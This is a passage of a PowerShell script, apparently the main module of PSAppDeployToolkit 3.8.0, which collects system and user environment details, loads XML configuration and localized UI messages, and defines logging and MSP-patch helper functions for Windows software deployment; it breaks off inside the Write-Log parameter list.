﻿
[CmdletBinding()]
Param (
	
	[switch]$ShowInstallationPrompt = $false,
	[switch]$ShowInstallationRestartPrompt = $false,
	[switch]$CleanupBlockedApps = $false,
	[switch]$ShowBlockedAppDialog = $false,
	[switch]$DisableLogging = $false,
	[string]$ReferredInstallName = '',
	[string]$ReferredInstallTitle = '',
	[string]$ReferredLogName = '',
	[string]$Title = '',
	[string]$Message = '',
	[string]$MessageAlignment = '',
	[string]$ButtonRightText = '',
	[string]$ButtonLeftText = '',
	[string]$ButtonMiddleText = '',
	[string]$Icon = '',
	[string]$Timeout = '',
	[switch]$ExitOnTimeout = $false,
	[boolean]$MinimizeWindows = $false,
	[switch]$PersistPrompt = $false,
	[int32]$CountdownSeconds,
	[int32]$CountdownNoHideSeconds,
	[switch]$NoCountdown = $false,
	[switch]$AsyncToolkitLaunch = $false
)







[string]$appDeployToolkitName = 'PSAppDeployToolkit'
[string]$appDeployMainScriptFriendlyName = 'App Deploy Toolkit Main'


[version]$appDeployMainScriptVersion = [version]'3.8.0'
[version]$appDeployMainScriptMinimumConfigVersion = [version]'3.8.0'
[string]$appDeployMainScriptDate = '23/09/2019'
[hashtable]$appDeployMainScriptParameters = $PSBoundParameters


[datetime]$currentDateTime = Get-Date
[string]$currentTime = Get-Date -Date $currentDateTime -UFormat '%T'
[string]$currentDate = Get-Date -Date $currentDateTime -UFormat '%d-%m-%Y'
[timespan]$currentTimeZoneBias = [timezone]::CurrentTimeZone.GetUtcOffset([datetime]::Now)
[Globalization.CultureInfo]$culture = Get-Culture
[string]$currentLanguage = $culture.TwoLetterISOLanguageName.ToUpper()
[Globalization.CultureInfo]$uiculture = Get-UICulture
[string]$currentUILanguage = $uiculture.TwoLetterISOLanguageName.ToUpper()


[psobject]$envHost = $Host
[psobject]$envShellFolders = Get-ItemProperty -Path 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -ErrorAction 'SilentlyContinue'
[string]$envAllUsersProfile = $env:ALLUSERSPROFILE
[string]$envAppData = [Environment]::GetFolderPath('ApplicationData')
[string]$envArchitecture = $env:PROCESSOR_ARCHITECTURE
[string]$envCommonProgramFiles = [Environment]::GetFolderPath('CommonProgramFiles')
[string]$envCommonProgramFilesX86 = ${env:CommonProgramFiles(x86)}
[string]$envCommonDesktop   = $envShellFolders | Select-Object -ExpandProperty 'Common Desktop' -ErrorAction 'SilentlyContinue'
[string]$envCommonDocuments = $envShellFolders | Select-Object -ExpandProperty 'Common Documents' -ErrorAction 'SilentlyContinue'
[string]$envCommonStartMenuPrograms  = $envShellFolders | Select-Object -ExpandProperty 'Common Programs' -ErrorAction 'SilentlyContinue'
[string]$envCommonStartMenu = $envShellFolders | Select-Object -ExpandProperty 'Common Start Menu' -ErrorAction 'SilentlyContinue'
[string]$envCommonStartUp   = $envShellFolders | Select-Object -ExpandProperty 'Common Startup' -ErrorAction 'SilentlyContinue'
[string]$envCommonTemplates = $envShellFolders | Select-Object -ExpandProperty 'Common Templates' -ErrorAction 'SilentlyContinue'
[string]$envComputerName = [Environment]::MachineName.ToUpper()
[string]$envComputerNameFQDN = ([Net.Dns]::GetHostEntry('localhost')).HostName
[string]$envHomeDrive = $env:HOMEDRIVE
[string]$envHomePath = $env:HOMEPATH
[string]$envHomeShare = $env:HOMESHARE
[string]$envLocalAppData = [Environment]::GetFolderPath('LocalApplicationData')
[string[]]$envLogicalDrives = [Environment]::GetLogicalDrives()
[string]$envProgramFiles = [Environment]::GetFolderPath('ProgramFiles')
[string]$envProgramFilesX86 = ${env:ProgramFiles(x86)}
[string]$envProgramData = [Environment]::GetFolderPath('CommonApplicationData')
[string]$envPublic = $env:PUBLIC
[string]$envSystemDrive = $env:SYSTEMDRIVE
[string]$envSystemRoot = $env:SYSTEMROOT
[string]$envTemp = [IO.Path]::GetTempPath()
[string]$envUserCookies = [Environment]::GetFolderPath('Cookies')
[string]$envUserDesktop = [Environment]::GetFolderPath('DesktopDirectory')
[string]$envUserFavorites = [Environment]::GetFolderPath('Favorites')
[string]$envUserInternetCache = [Environment]::GetFolderPath('InternetCache')
[string]$envUserInternetHistory = [Environment]::GetFolderPath('History')
[string]$envUserMyDocuments = [Environment]::GetFolderPath('MyDocuments')
[string]$envUserName = [Environment]::UserName
[string]$envUserPictures = [Environment]::GetFolderPath('MyPictures')
[string]$envUserProfile = $env:USERPROFILE
[string]$envUserSendTo = [Environment]::GetFolderPath('SendTo')
[string]$envUserStartMenu = [Environment]::GetFolderPath('StartMenu')
[string]$envUserStartMenuPrograms = [Environment]::GetFolderPath('Programs')
[string]$envUserStartUp = [Environment]::GetFolderPath('StartUp')
[string]$envUserTemplates = [Environment]::GetFolderPath('Templates')
[string]$envSystem32Directory = [Environment]::SystemDirectory
[string]$envWinDir = $env:WINDIR

If (-not $envCommonProgramFilesX86) { [string]$envCommonProgramFilesX86 = $envCommonProgramFiles }
If (-not $envProgramFilesX86) { [string]$envProgramFilesX86 = $envProgramFiles }


[boolean]$IsMachinePartOfDomain = (Get-WmiObject -Class 'Win32_ComputerSystem' -ErrorAction 'SilentlyContinue').PartOfDomain
[string]$envMachineWorkgroup = ''
[string]$envMachineADDomain = ''
[string]$envLogonServer = ''
[string]$MachineDomainController = ''
If ($IsMachinePartOfDomain) {
	[string]$envMachineADDomain = (Get-WmiObject -Class 'Win32_ComputerSystem' -ErrorAction 'SilentlyContinue').Domain | Where-Object { $_ } | ForEach-Object { $_.ToLower() }
	Try {
		[string]$envLogonServer = $env:LOGONSERVER | Where-Object { (($_) -and (-not $_.Contains('\\MicrosoftAccount'))) } | ForEach-Object { $_.TrimStart('\') } | ForEach-Object { ([Net.Dns]::GetHostEntry($_)).HostName }
		
		If (-not $envLogonServer) { [string]$envLogonServer = Get-ItemProperty -LiteralPath 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History' -ErrorAction 'SilentlyContinue' | Select-Object -ExpandProperty 'DCName' -ErrorAction 'SilentlyContinue' }
		[string]$MachineDomainController = [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
	}
	Catch { }
}
Else {
	[string]$envMachineWorkgroup = (Get-WmiObject -Class 'Win32_ComputerSystem' -ErrorAction 'SilentlyContinue').Domain | Where-Object { $_ } | ForEach-Object { $_.ToUpper() }
}
[string]$envMachineDNSDomain = [Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName | Where-Object { $_ } | ForEach-Object { $_.ToLower() }
[string]$envUserDNSDomain = $env:USERDNSDOMAIN | Where-Object { $_ } | ForEach-Object { $_.ToLower() }
Try {
	[string]$envUserDomain = [Environment]::UserDomainName.ToUpper()
}
Catch { }


[psobject]$envOS = Get-WmiObject -Class 'Win32_OperatingSystem' -ErrorAction 'SilentlyContinue'
[string]$envOSName = $envOS.Caption.Trim()
[string]$envOSServicePack = $envOS.CSDVersion
[version]$envOSVersion = $envOS.Version
[string]$envOSVersionMajor = $envOSVersion.Major
[string]$envOSVersionMinor = $envOSVersion.Minor
[string]$envOSVersionBuild = $envOSVersion.Build
If ($envOSVersionMajor -eq 10) {$envOSVersionRevision = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name 'UBR' -ErrorAction SilentlyContinue).UBR}
Else { [string]$envOSVersionRevision = ,((Get-ItemProperty -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name 'BuildLabEx' -ErrorAction 'SilentlyContinue').BuildLabEx -split '\.') | ForEach-Object { $_[1] } }
If ($envOSVersionRevision -notmatch '^[\d\.]+$') { $envOSVersionRevision = '' }
If ($envOSVersionRevision) { [string]$envOSVersion = "$($envOSVersion.ToString()).$envOSVersionRevision" } Else { "$($envOSVersion.ToString())" }

[int32]$envOSProductType = $envOS.ProductType
[boolean]$IsServerOS = [boolean]($envOSProductType -eq 3)
[boolean]$IsDomainControllerOS = [boolean]($envOSProductType -eq 2)
[boolean]$IsWorkStationOS = [boolean]($envOSProductType -eq 1)
Switch ($envOSProductType) {
	3 { [string]$envOSProductTypeName = 'Server' }
	2 { [string]$envOSProductTypeName = 'Domain Controller' }
	1 { [string]$envOSProductTypeName = 'Workstation' }
	Default { [string]$envOSProductTypeName = 'Unknown' }
}

[boolean]$Is64Bit = [boolean]((Get-WmiObject -Class 'Win32_Processor' -ErrorAction 'SilentlyContinue' | Where-Object { $_.DeviceID -eq 'CPU0' } | Select-Object -ExpandProperty 'AddressWidth') -eq 64)
If ($Is64Bit) { [string]$envOSArchitecture = '64-bit' } Else { [string]$envOSArchitecture = '32-bit' }


[boolean]$Is64BitProcess = [boolean]([IntPtr]::Size -eq 8)
If ($Is64BitProcess) { [string]$psArchitecture = 'x64' } Else { [string]$psArchitecture = 'x86' }


[int32]$envSystemRAM = Get-WMIObject -Class Win32_PhysicalMemory -ComputerName $env:COMPUTERNAME -ErrorAction 'SilentlyContinue' | Measure-Object -Property Capacity -Sum -ErrorAction SilentlyContinue | ForEach-Object {[Math]::Round(($_.sum / 1GB),2)}


[hashtable]$envPSVersionTable = $PSVersionTable

[version]$envPSVersion = $envPSVersionTable.PSVersion
[string]$envPSVersionMajor = $envPSVersion.Major
[string]$envPSVersionMinor = $envPSVersion.Minor
[string]$envPSVersionBuild = $envPSVersion.Build
[string]$envPSVersionRevision = $envPSVersion.Revision
[string]$envPSVersion = $envPSVersion.ToString()

[version]$envCLRVersion = $envPSVersionTable.CLRVersion
[string]$envCLRVersionMajor = $envCLRVersion.Major
[string]$envCLRVersionMinor = $envCLRVersion.Minor
[string]$envCLRVersionBuild = $envCLRVersion.Build
[string]$envCLRVersionRevision = $envCLRVersion.Revision
[string]$envCLRVersion = $envCLRVersion.ToString()


[Security.Principal.WindowsIdentity]$CurrentProcessToken = [Security.Principal.WindowsIdentity]::GetCurrent()
[Security.Principal.SecurityIdentifier]$CurrentProcessSID = $CurrentProcessToken.User
[string]$ProcessNTAccount = $CurrentProcessToken.Name
[string]$ProcessNTAccountSID = $CurrentProcessSID.Value
[boolean]$IsAdmin = [boolean]($CurrentProcessToken.Groups -contains [Security.Principal.SecurityIdentifier]'S-1-5-32-544')
[boolean]$IsLocalSystemAccount = $CurrentProcessSID.IsWellKnown([Security.Principal.WellKnownSidType]'LocalSystemSid')
[boolean]$IsLocalServiceAccount = $CurrentProcessSID.IsWellKnown([Security.Principal.WellKnownSidType]'LocalServiceSid')
[boolean]$IsNetworkServiceAccount = $CurrentProcessSID.IsWellKnown([Security.Principal.WellKnownSidType]'NetworkServiceSid')
[boolean]$IsServiceAccount = [boolean]($CurrentProcessToken.Groups -contains [Security.Principal.SecurityIdentifier]'S-1-5-6')
[boolean]$IsProcessUserInteractive = [Environment]::UserInteractive
[string]$LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value

If ($IsLocalSystemAccount -or $IsLocalServiceAccount -or $IsNetworkServiceAccount -or $IsServiceAccount) { $SessionZero = $true } Else { $SessionZero = $false }


[string]$scriptPath = $MyInvocation.MyCommand.Definition
[string]$scriptName = [IO.Path]::GetFileNameWithoutExtension($scriptPath)
[string]$scriptFileName = Split-Path -Path $scriptPath -Leaf
[string]$scriptRoot = Split-Path -Path $scriptPath -Parent
[string]$invokingScript = (Get-Variable -Name 'MyInvocation').Value.ScriptName

If ($invokingScript) {
	
	[string]$scriptParentPath = Split-Path -Path $invokingScript -Parent
}
Else {
	
	[string]$scriptParentPath = (Get-Item -LiteralPath $scriptRoot).Parent.FullName
}


[string]$appDeployConfigFile = Join-Path -Path $scriptRoot -ChildPath 'AppDeployToolkitConfig.xml'
[string]$appDeployCustomTypesSourceCode = Join-Path -Path $scriptRoot -ChildPath 'AppDeployToolkitMain.cs'
If (-not (Test-Path -LiteralPath $appDeployConfigFile -PathType 'Leaf')) { Throw 'App Deploy XML configuration file not found.' }
If (-not (Test-Path -LiteralPath $appDeployCustomTypesSourceCode -PathType 'Leaf')) { Throw 'App Deploy custom types source code file not found.' }


[string]$appDeployToolkitDotSourceExtensions = 'AppDeployToolkitExtensions.ps1'


[Xml.XmlDocument]$xmlConfigFile = Get-Content -LiteralPath $AppDeployConfigFile
[Xml.XmlElement]$xmlConfig = $xmlConfigFile.AppDeployToolkit_Config

[Xml.XmlElement]$configConfigDetails = $xmlConfig.Config_File
[string]$configConfigVersion = [version]$configConfigDetails.Config_Version
[string]$configConfigDate = $configConfigDetails.Config_Date


[Xml.XmlElement]$xmlBannerIconOptions = $xmlConfig.BannerIcon_Options
[string]$configBannerIconFileName = $xmlBannerIconOptions.Icon_Filename
[string]$configBannerIconBannerName = $xmlBannerIconOptions.Banner_Filename
[Int32]$appDeployLogoBannerMaxHeight = $xmlBannerIconOptions.Banner_MaxHeight

[string]$appDeployLogoIcon = Join-Path -Path $scriptRoot -ChildPath $configBannerIconFileName
[string]$appDeployLogoBanner = Join-Path -Path $scriptRoot -ChildPath $configBannerIconBannerName

If (-not (Test-Path -LiteralPath $appDeployLogoIcon -PathType 'Leaf')) { Throw 'App Deploy logo icon file not found.' }
If (-not (Test-Path -LiteralPath $appDeployLogoBanner -PathType 'Leaf')) { Throw 'App Deploy logo banner file not found.' }

Add-Type -AssemblyName 'System.Drawing' -ErrorAction 'Stop'
[System.Drawing.Bitmap]$appDeployLogoBannerObject = New-Object System.Drawing.Bitmap $appDeployLogoBanner
[Int32]$appDeployLogoBannerBaseHeight = 50

[Int32]$appDeployLogoBannerHeight = $appDeployLogoBannerObject.Height
if ($appDeployLogoBannerHeight -gt $appDeployLogoBannerMaxHeight) {
	$appDeployLogoBannerHeight = $appDeployLogoBannerMaxHeight
}
[Int32]$appDeployLogoBannerHeightDifference = $appDeployLogoBannerHeight - $appDeployLogoBannerBaseHeight


[Xml.XmlElement]$xmlToolkitOptions = $xmlConfig.Toolkit_Options
[boolean]$configToolkitRequireAdmin = [boolean]::Parse($xmlToolkitOptions.Toolkit_RequireAdmin)
[string]$configToolkitTempPath = $ExecutionContext.InvokeCommand.ExpandString($xmlToolkitOptions.Toolkit_TempPath)
[string]$configToolkitRegPath = $xmlToolkitOptions.Toolkit_RegPath
[string]$configToolkitLogDir = $ExecutionContext.InvokeCommand.ExpandString($xmlToolkitOptions.Toolkit_LogPath)
[boolean]$configToolkitCompressLogs = [boolean]::Parse($xmlToolkitOptions.Toolkit_CompressLogs)
[string]$configToolkitLogStyle = $xmlToolkitOptions.Toolkit_LogStyle
[double]$configToolkitLogMaxSize = $xmlToolkitOptions.Toolkit_LogMaxSize
[boolean]$configToolkitLogWriteToHost = [boolean]::Parse($xmlToolkitOptions.Toolkit_LogWriteToHost)
[boolean]$configToolkitLogDebugMessage = [boolean]::Parse($xmlToolkitOptions.Toolkit_LogDebugMessage)

[Xml.XmlElement]$xmlConfigMSIOptions = $xmlConfig.MSI_Options
[string]$configMSILoggingOptions = $xmlConfigMSIOptions.MSI_LoggingOptions
[string]$configMSIInstallParams = $ExecutionContext.InvokeCommand.ExpandString($xmlConfigMSIOptions.MSI_InstallParams)
[string]$configMSISilentParams = $ExecutionContext.InvokeCommand.ExpandString($xmlConfigMSIOptions.MSI_SilentParams)
[string]$configMSIUninstallParams = $ExecutionContext.InvokeCommand.ExpandString($xmlConfigMSIOptions.MSI_UninstallParams)
[string]$configMSILogDir = $ExecutionContext.InvokeCommand.ExpandString($xmlConfigMSIOptions.MSI_LogPath)
[int32]$configMSIMutexWaitTime = $xmlConfigMSIOptions.MSI_MutexWaitTime

[Xml.XmlElement]$xmlConfigUIOptions = $xmlConfig.UI_Options
[string]$configInstallationUILanguageOverride = $xmlConfigUIOptions.InstallationUI_LanguageOverride
[boolean]$configShowBalloonNotifications = [boolean]::Parse($xmlConfigUIOptions.ShowBalloonNotifications)
[int32]$configInstallationUITimeout = $xmlConfigUIOptions.InstallationUI_Timeout
[int32]$configInstallationUIExitCode = $xmlConfigUIOptions.InstallationUI_ExitCode
[int32]$configInstallationDeferExitCode = $xmlConfigUIOptions.InstallationDefer_ExitCode
[int32]$configInstallationPersistInterval = $xmlConfigUIOptions.InstallationPrompt_PersistInterval
[int32]$configInstallationRestartPersistInterval = $xmlConfigUIOptions.InstallationRestartPrompt_PersistInterval
[int32]$configInstallationPromptToSave = $xmlConfigUIOptions.InstallationPromptToSave_Timeout
[boolean]$configInstallationWelcomePromptDynamicRunningProcessEvaluation = [boolean]::Parse($xmlConfigUIOptions.InstallationWelcomePrompt_DynamicRunningProcessEvaluation)
[int32]$configInstallationWelcomePromptDynamicRunningProcessEvaluationInterval = $xmlConfigUIOptions.InstallationWelcomePrompt_DynamicRunningProcessEvaluationInterval

[scriptblock]$xmlLoadLocalizedUIMessages = {
	
	If ($RunAsActiveUser) {
		
		If (-not $HKULanguages) {
			[string[]]$HKULanguages = Get-RegistryKey -Key 'HKLM:SOFTWARE\Policies\Microsoft\MUI\Settings' -Value 'PreferredUILanguages'
		}
		If (-not $HKULanguages) {
			[string[]]$HKULanguages = Get-RegistryKey -Key 'HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop' -Value 'PreferredUILanguages' -SID $RunAsActiveUser.SID
		}
		
		If (-not $HKULanguages) {
			[string[]]$HKULanguages = Get-RegistryKey -Key 'HKCU\Control Panel\Desktop' -Value 'PreferredUILanguages' -SID $RunAsActiveUser.SID
		}
		If (-not $HKULanguages) {
			[string[]]$HKULanguages = Get-RegistryKey -Key 'HKCU\Control Panel\Desktop\MuiCached' -Value 'MachinePreferredUILanguages' -SID $RunAsActiveUser.SID
		}
		If (-not $HKULanguages) {
			[string[]]$HKULanguages = Get-RegistryKey -Key 'HKCU\Control Panel\International' -Value 'LocaleName' -SID $RunAsActiveUser.SID
		}
		
		If (-not $HKULanguages) {
			[string]$HKULocale = Get-RegistryKey -Key 'HKCU\Control Panel\International' -Value 'Locale' -SID $RunAsActiveUser.SID
			If ($HKULocale) {
				[int32]$HKULocale = [Convert]::ToInt32('0x' + $HKULocale, 16)
				[string[]]$HKULanguages = ([Globalization.CultureInfo]($HKULocale)).Name
			}
		}
		If ($HKULanguages) {
			[Globalization.CultureInfo]$PrimaryWindowsUILanguage = [Globalization.CultureInfo]($HKULanguages[0])
			[string]$HKUPrimaryLanguageShort = $PrimaryWindowsUILanguage.TwoLetterISOLanguageName.ToUpper()

			
			If ($HKUPrimaryLanguageShort -eq 'ZH') {
				If ($PrimaryWindowsUILanguage.EnglishName -match 'Simplified') {
					[string]$HKUPrimaryLanguageShort = 'ZH-Hans'
				}
				If ($PrimaryWindowsUILanguage.EnglishName -match 'Traditional') {
					[string]$HKUPrimaryLanguageShort = 'ZH-Hant'
				}
			}

			
			If ($HKUPrimaryLanguageShort -eq 'PT') {
				If ($PrimaryWindowsUILanguage.ThreeLetterWindowsLanguageName -eq 'PTB') {
					[string]$HKUPrimaryLanguageShort = 'PT-BR'
				}
			}
		}
	}

	If ($HKUPrimaryLanguageShort) {
		
		[string]$xmlUIMessageLanguage = "UI_Messages_$HKUPrimaryLanguageShort"
	}
	Else {
		
		[string]$xmlUIMessageLanguage = "UI_Messages_$currentLanguage"
	}
	
	If (-not ($xmlConfig.$xmlUIMessageLanguage)) { [string]$xmlUIMessageLanguage = 'UI_Messages_EN' }
	
	If ($configInstallationUILanguageOverride) { [string]$xmlUIMessageLanguage = "UI_Messages_$configInstallationUILanguageOverride" }

	[Xml.XmlElement]$xmlUIMessages = $xmlConfig.$xmlUIMessageLanguage
	[string]$configDiskSpaceMessage = $xmlUIMessages.DiskSpace_Message
	[string]$configBalloonTextStart = $xmlUIMessages.BalloonText_Start
	[string]$configBalloonTextComplete = $xmlUIMessages.BalloonText_Complete
	[string]$configBalloonTextRestartRequired = $xmlUIMessages.BalloonText_RestartRequired
	[string]$configBalloonTextFastRetry = $xmlUIMessages.BalloonText_FastRetry
	[string]$configBalloonTextError = $xmlUIMessages.BalloonText_Error
	[string]$configProgressMessageInstall = $xmlUIMessages.Progress_MessageInstall
	[string]$configProgressMessageUninstall = $xmlUIMessages.Progress_MessageUninstall
	[string]$configClosePromptMessage = $xmlUIMessages.ClosePrompt_Message
	[string]$configClosePromptButtonClose = $xmlUIMessages.ClosePrompt_ButtonClose
	[string]$configClosePromptButtonDefer = $xmlUIMessages.ClosePrompt_ButtonDefer
	[string]$configClosePromptButtonContinue = $xmlUIMessages.ClosePrompt_ButtonContinue
	[string]$configClosePromptButtonContinueTooltip = $xmlUIMessages.ClosePrompt_ButtonContinueTooltip
	[string]$configClosePromptCountdownMessage = $xmlUIMessages.ClosePrompt_CountdownMessage
	[string]$configDeferPromptWelcomeMessage = $xmlUIMessages.DeferPrompt_WelcomeMessage
	[string]$configDeferPromptExpiryMessage = $xmlUIMessages.DeferPrompt_ExpiryMessage
	[string]$configDeferPromptWarningMessage = $xmlUIMessages.DeferPrompt_WarningMessage
	[string]$configDeferPromptRemainingDeferrals = $xmlUIMessages.DeferPrompt_RemainingDeferrals
	[string]$configDeferPromptDeadline = $xmlUIMessages.DeferPrompt_Deadline
	[string]$configBlockExecutionMessage = $xmlUIMessages.BlockExecution_Message
	[string]$configDeploymentTypeInstall = $xmlUIMessages.DeploymentType_Install
	[string]$configDeploymentTypeUnInstall = $xmlUIMessages.DeploymentType_UnInstall
	[string]$configRestartPromptTitle = $xmlUIMessages.RestartPrompt_Title
	[string]$configRestartPromptMessage = $xmlUIMessages.RestartPrompt_Message
	[string]$configRestartPromptMessageTime = $xmlUIMessages.RestartPrompt_MessageTime
	[string]$configRestartPromptMessageRestart = $xmlUIMessages.RestartPrompt_MessageRestart
	[string]$configRestartPromptTimeRemaining = $xmlUIMessages.RestartPrompt_TimeRemaining
	[string]$configRestartPromptButtonRestartLater = $xmlUIMessages.RestartPrompt_ButtonRestartLater
	[string]$configRestartPromptButtonRestartNow = $xmlUIMessages.RestartPrompt_ButtonRestartNow
	[string]$configWelcomePromptCountdownMessage = $xmlUIMessages.WelcomePrompt_CountdownMessage
	[string]$configWelcomePromptCustomMessage = $xmlUIMessages.WelcomePrompt_CustomMessage
}


[string]$dirFiles = Join-Path -Path $scriptParentPath -ChildPath 'Files'
[string]$dirSupportFiles = Join-Path -Path $scriptParentPath -ChildPath 'SupportFiles'
[string]$dirAppDeployTemp = Join-Path -Path $configToolkitTempPath -ChildPath $appDeployToolkitName


If (-not $deploymentType) { [string]$deploymentType = 'Install' }


[string]$exeWusa = 'wusa.exe' 
[string]$exeMsiexec = 'msiexec.exe' 
[string]$exeSchTasks = "$envWinDir\System32\schtasks.exe" 


[string]$MSIProductCodeRegExPattern = '^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$'



[string[]]$regKeyApplications = 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
If ($is64Bit) {
	[string]$regKeyLotusNotes = 'HKLM:SOFTWARE\Wow6432Node\Lotus\Notes'
}
Else {
	[string]$regKeyLotusNotes = 'HKLM:SOFTWARE\Lotus\Notes'
}
[string]$regKeyAppExecution = 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'


[__comobject]$Shell = New-Object -ComObject 'WScript.Shell' -ErrorAction 'SilentlyContinue'
[__comobject]$ShellApp = New-Object -ComObject 'Shell.Application' -ErrorAction 'SilentlyContinue'


[boolean]$msiRebootDetected = $false
[boolean]$BlockExecution = $false
[boolean]$installationStarted = $false
[boolean]$runningTaskSequence = $false
If (Test-Path -LiteralPath 'variable:welcomeTimer') { Remove-Variable -Name 'welcomeTimer' -Scope 'Script'}

If (Test-Path -LiteralPath 'variable:deferHistory') { Remove-Variable -Name 'deferHistory' }
If (Test-Path -LiteralPath 'variable:deferTimes') { Remove-Variable -Name 'deferTimes' }
If (Test-Path -LiteralPath 'variable:deferDays') { Remove-Variable -Name 'deferDays' }


[scriptblock]$GetDisplayScaleFactor = {
	
	[boolean]$UserDisplayScaleFactor = $false
	If ($RunAsActiveUser) {
		[int32]$dpiPixels = Get-RegistryKey -Key 'HKCU\Control Panel\Desktop\WindowMetrics' -Value 'AppliedDPI' -SID $RunAsActiveUser.SID
		If (-not ([string]$dpiPixels)) {
			[int32]$dpiPixels = Get-RegistryKey -Key 'HKCU\Control Panel\Desktop' -Value 'LogPixels' -SID $RunAsActiveUser.SID
		}
		[boolean]$UserDisplayScaleFactor = $true
	}
	If (-not ([string]$dpiPixels)) {
		
		[int32]$dpiPixels = Get-RegistryKey -Key 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontDPI' -Value 'LogPixels'
		[boolean]$UserDisplayScaleFactor = $false
	}
	Switch ($dpiPixels) {
		96 { [int32]$dpiScale = 100 }
		120 { [int32]$dpiScale = 125 }
		144 { [int32]$dpiScale = 150 }
		192 { [int32]$dpiScale = 200 }
		Default { [int32]$dpiScale = 100 }
	}
}











Function Write-FunctionHeaderOrFooter {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$CmdletName,
		[Parameter(Mandatory=$true,ParameterSetName='Header')]
		[AllowEmptyCollection()]
		[hashtable]$CmdletBoundParameters,
		[Parameter(Mandatory=$true,ParameterSetName='Header')]
		[switch]$Header,
		[Parameter(Mandatory=$true,ParameterSetName='Footer')]
		[switch]$Footer
	)

	If ($Header) {
		Write-Log -Message 'Function Start' -Source ${CmdletName} -DebugMessage

		
		[string]$CmdletBoundParameters = $CmdletBoundParameters | Format-Table -Property @{ Label = 'Parameter'; Expression = { "[-$($_.Key)]" } }, @{ Label = 'Value'; Expression = { $_.Value }; Alignment = 'Left' }, @{ Label = 'Type'; Expression = { $_.Value.GetType().Name }; Alignment = 'Left' } -AutoSize -Wrap | Out-String
		If ($CmdletBoundParameters) {
			Write-Log -Message "Function invoked with bound parameter(s): `n$CmdletBoundParameters" -Source ${CmdletName} -DebugMessage
		}
		Else {
			Write-Log -Message 'Function invoked without any bound parameters.' -Source ${CmdletName} -DebugMessage
		}
	}
	ElseIf ($Footer) {
		Write-Log -Message 'Function End' -Source ${CmdletName} -DebugMessage
	}
}


Function Execute-MSP {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,HelpMessage='Please enter the path to the MSP file')]
		[ValidateScript({('.msp' -contains [IO.Path]::GetExtension($_))})]
		[Alias('FilePath')]
		[string]$Path
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		
		If (Test-Path -LiteralPath (Join-Path -Path $dirFiles -ChildPath $path -ErrorAction 'SilentlyContinue') -PathType 'Leaf' -ErrorAction 'SilentlyContinue') {
			[string]$mspFile = Join-Path -Path $dirFiles -ChildPath $path
		}
		ElseIf (Test-Path -LiteralPath $Path -ErrorAction 'SilentlyContinue') {
			[string]$mspFile = (Get-Item -LiteralPath $Path).FullName
		}
		Else {
			Write-Log -Message "Failed to find MSP file [$path]." -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to find MSP file [$path]."
			}
			Continue
		}
		Write-Log -Message 'Checking MSP file for valid product codes' -Source ${CmdletName}

		[boolean]$IsMSPNeeded = $false

		$Installer = New-Object -com WindowsInstaller.Installer
		$Database = $Installer.GetType().InvokeMember("OpenDatabase", "InvokeMethod", $Null, $Installer, $($mspFile,([int32]32)))
		[__comobject]$SummaryInformation = Get-ObjectProperty -InputObject $Database -PropertyName 'SummaryInformation'
		[hashtable]$SummaryInfoProperty = @{}
		$all = (Get-ObjectProperty -InputObject $SummaryInformation -PropertyName 'Property' -ArgumentList @(7)).Split(";")
		Foreach($FormattedProductCode in $all) {
			[psobject]$MSIInstalled = Get-InstalledApplication -ProductCode $FormattedProductCode
			If ($MSIInstalled) {[boolean]$IsMSPNeeded = $true }
		}
		Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($SummaryInformation) } Catch { }
		Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($DataBase) } Catch { }
		Try { $null = [Runtime.Interopservices.Marshal]::ReleaseComObject($Installer) } Catch { }
		If ($IsMSPNeeded) { Execute-MSI -Action Patch -Path $Path }
	}
}



Function Write-Log {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
		[AllowEmptyCollection()]
		[Alias('Text')]
		[string[]]$Message,
		[Parameter(Mandatory=$false,Position=1)]
		[ValidateRange(1,3)]
		[int16]$Severity = 1,
		[Parameter(Mandatory=$false,Position=2)]
		[ValidateNotNull()]
		[string]$Source = '',
		[Parameter(Mandatory=$false,Position=3)]
		[ValidateNotNullorEmpty()]
		[string]$ScriptSection = $script:installPhase,
		[Parameter(Mandatory=$false,Position=4)]
		[ValidateSet('CMTrace','Legacy')]
		[string]$LogType = $configToolkitLogStyle,
		[Parameter(Mandatory=$false,Position=5)]
		[ValidateNotNullorEmpty()]
		[string]$LogFileDirectory = $(If ($configToolkitCompressLogs) { $logTempFolder } Else { $configToolkitLogDir }),
		[Parameter(Mandatory=$false,Position=6)]
		[ValidateNotNullorEmpty()]
		[string]$LogFileName = $logName,
		[Parameter(Mandatory=$false,Position=7)]
		[ValidateNotNullorEmpty()]
		[decimal]$MaxLogFileSizeMB = $configToolkitLogMaxSize,
		[Parameter(Mandatory=$false,Position=8)]
		[ValidateNotNullorEmpty()]
